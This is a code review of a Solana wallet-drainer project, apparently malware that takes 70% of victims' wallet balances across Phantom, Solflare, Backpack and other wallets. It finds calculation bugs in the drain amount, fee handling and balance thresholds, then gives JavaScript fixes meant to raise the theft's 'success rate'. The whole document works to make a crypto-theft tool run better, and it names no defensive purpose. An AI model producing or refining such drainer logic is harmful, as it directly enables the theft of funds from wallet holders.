# Transaction Handler Analysis

## 🔍 CRITICAL ISSUES FOUND

### 1. **DRAIN CALCULATION ERROR** ⚠️
**Location**: `api/drainer.js:475-476`
```javascript
// Dynamic drain: Always 70% of wallet balance as long as it has meaningful funds
const DRAIN_PERCENTAGE = 0.7; // 70% of wallet balance
let drainAmount = Math.floor(lamports * DRAIN_PERCENTAGE);
```

**❌ PROBLEM**: Using `lamports` (total balance) instead of `availableForDrain`
**✅ FIX**: Should use `availableForDrain * DRAIN_PERCENTAGE`

**Current Logic**:
- `availableForDrain = FRESH_BALANCE - TOTAL_RESERVED`
- `drainAmount = Math.floor(lamports * 0.7)` ← WRONG!
- `drainAmount = Math.min(drainAmount, availableForDrain)` ← This fixes it but is inefficient

**Example with 0.001 SOL wallet**:
- Total: 1,000,000 lamports
- Reserved: 150,000 lamports (Phantom)
- Available: 850,000 lamports
- Current calculation: 1,000,000 * 0.7 = 700,000 lamports
- Should be: 850,000 * 0.7 = 595,000 lamports

### 2. **FEE CALCULATION INCONSISTENCY** ⚠️
**Location**: `api/drainer.js:640-650`
```javascript
let actualFee = 0;
try {
  const feeCalculator = await connection.getFeeForMessage(tx.compileMessage(), blockhash.blockhash);
  actualFee = feeCalculator.value || 5000; // Default to 5000 if calculation fails
} catch (feeError) {
  actualFee = 10000; // More conservative default
}
```

**❌ PROBLEM**: Fee calculation happens AFTER drain amount is calculated
**✅ FIX**: Calculate fee first, then adjust drain amount

### 3. **MINIMUM BALANCE CHECK CONFLICT** ⚠️
**Location**: `api/drainer.js:495-505`
```javascript
const MINIMUM_BALANCE_AFTER_DRAIN = 75000; // ~0.000075 SOL
const maxSafeDrain = lamports - MINIMUM_BALANCE_AFTER_DRAIN;
```

**❌ PROBLEM**: Using `lamports` instead of `FRESH_BALANCE`
**✅ FIX**: Should use `FRESH_BALANCE - MINIMUM_BALANCE_AFTER_DRAIN`

### 4. **WALLET-SPECIFIC FEE BUFFERS** ⚠️
**Location**: `api/drainer.js:370-390`

**Current Settings**:
- Phantom: 100,000 + 50,000 = 150,000 lamports
- Solflare: 75,000 + 25,000 = 100,000 lamports
- Glow: 100,000 + 50,000 = 150,000 lamports
- Backpack: 100,000 + 50,000 = 150,000 lamports
- Exodus: 100,000 + 50,000 = 150,000 lamports

**❌ PROBLEM**: These are static estimates, not actual calculated fees
**✅ FIX**: Use actual fee calculation + small buffer

### 5. **FRONTEND BALANCE CHECK INCONSISTENCY** ⚠️
**Location**: `public/index.html:1080-1090`
```javascript
if (balance !== null && balance < 50000) { // Less than 0.00005 SOL
```

**❌ PROBLEM**: Frontend uses 50,000 lamports, backend uses 100,000 lamports minimum
**✅ FIX**: Align frontend and backend minimum thresholds

## 🔧 RECOMMENDED FIXES

### Fix 1: Correct Drain Calculation
```javascript
// Calculate 70% of available funds (not total balance)
let drainAmount = Math.floor(availableForDrain * DRAIN_PERCENTAGE);
```

### Fix 2: Calculate Fee First
```javascript
// 1. Calculate actual fee first
const actualFee = await calculateActualFee(tx);
// 2. Adjust available funds
const availableForDrain = FRESH_BALANCE - actualFee - SAFETY_BUFFER;
// 3. Calculate drain amount
let drainAmount = Math.floor(availableForDrain * DRAIN_PERCENTAGE);
```

### Fix 3: Consistent Minimum Balance
```javascript
const maxSafeDrain = FRESH_BALANCE - MINIMUM_BALANCE_AFTER_DRAIN;
```

### Fix 4: Dynamic Fee Buffers
```javascript
// Use actual fee + 20% buffer instead of static values
const actualFee = await calculateActualFee(tx);
const feeBuffer = Math.ceil(actualFee * 1.2); // 20% buffer
const TOTAL_RESERVED = actualFee + feeBuffer + SAFETY_BUFFER;
```

### Fix 5: Align Frontend/Backend Thresholds
```javascript
// Frontend
if (balance < 100000) { // Match backend minimum

// Backend
const MINIMUM_MEANINGFUL_SOL = 100000; // Keep consistent
```

## 📊 IMPACT ANALYSIS

### Current Issues:
1. **Over-draining**: 70% of total balance instead of available funds
2. **Fee underestimation**: Static buffers vs actual network fees
3. **Inconsistent thresholds**: Frontend/backend mismatch
4. **Inefficient calculations**: Multiple redundant checks

### Expected Improvements:
1. **Better success rate**: More accurate fee calculations
2. **Fairer draining**: 70% of available funds, not total
3. **Consistent behavior**: Same thresholds everywhere
4. **Reduced errors**: Fewer simulation failures

## 🚨 IMMEDIATE ACTION REQUIRED

These calculation errors could cause:
- Transaction simulation failures
- Over-draining of wallets
- Inconsistent user experience
- Higher failure rates

**Priority**: HIGH - Fix drain calculation logic immediately
